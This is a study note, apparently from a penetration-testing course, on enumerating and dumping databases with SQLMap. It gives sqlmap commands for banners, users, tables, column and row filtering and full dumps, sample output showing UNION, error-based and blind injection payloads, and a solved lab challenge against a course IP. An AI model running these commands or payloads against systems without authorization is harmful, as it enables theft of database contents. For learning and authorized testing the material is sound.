+++
title = "Database Enumeration"
summary = "SQLMap Data Exfiltration and Basic DB Data Enumeration with SQLMap"
+++
-> Enumeration represents the central part of an SQL injection attack, which is done right after the successful detection and confirmation of exploitability of the targeted SQLi vulnerability. It consists of lookup and retrieval (i.e., exfiltration) of all the available information from the vulnerable database.

## SQLMap Data Exfiltration
-> If a user wants to retrieve the "banner" (switch <span style="color:rgb(129, 249, 31)">--banner</span>) for the target based on MySQL DBMS, The VERSION() query will be used for such purpose.
In case of retrieval of the current user name (switch --current-user), the CURRENT_USER() query will be used.
When extracting data like all usernames, SQLMap uses two approaches. In <span style="color:rgb(129, 249, 31)">inband</span> SQLi (UNION-based or error-based), results are directly shown in the web response, so the whole data can be pulled at once. In blind SQLi (Boolean-or-Time-based), results aren't visible, so SQLMap retrieves them slowly- row by row, column by column and even bit by bit if needed

## Basic DB Data Enumeration

Enumeration usually starts with the retrieval of the basic information:

- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)

```shell
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 13:30:57 /2020-09-17/

[13:30:57] [INFO] resuming back-end DBMS 'mysql' 
[13:30:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5134=5134

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
---
[13:30:57] [INFO] the back-end DBMS is MySQL
[13:30:57] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
[13:30:58] [INFO] fetching current user
current user: 'root@%'
[13:30:58] [INFO] fetching current database
current database: 'testdb'
[13:30:58] [INFO] testing if current user is DBA
[13:30:58] [INFO] fetching current user
current user is DBA: True
[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'

[*] ending @ 13:30:58 /2020-09-17/
```

From the above example, we can see that the database version is quite old (MySQL 5.1.41 - from November 2009), and the current user name is `root`, while the current database name is `testdb`.

Note: <span style="color:rgb(255, 255, 0)">The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.</span> 

## Table Enumeration

- If you want to retrieve table names of a DB
```bash
sqlmap -u 'http://example.com' --tables -D testdb
```

- If we want to specify particular table then
```bash
sqlmap 'http://example.com' --dump -T users -D testdb
```

## Table / Row Enumeration

- We can specify columns with <span style="color:rgb(129, 249, 31)">-C</span> option
```bash
sqlmap -u 'http://example.com' --dump -T users -D testdb -C name, surname
```

To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry), as follows:

```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumeration

If there is a requirement to retrieve certain rows based on a known `WHERE` condition (e.g. `name LIKE 'f%'`), we can use the option `--where`, as follows:

```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

## Full DB Enumeration
-> we can retrieve all tables inside the database of interest by skipping the usage of option `-T` altogether (e.g. `--dump -D testdb`). By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. As for the `--dump-all` switch, all the content from all the databases will be retrieved

In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.

****

## Challenge

1. What's the contents of table flag1 in the testdb database? (Case #1)

- Lets navigate there first
- Now command
```bash
sqlmap -u 'http://94.237.61.242:53351/case1.php?id=1*' -T flag1 -D testdb --batch --dump
```
- Viola!!

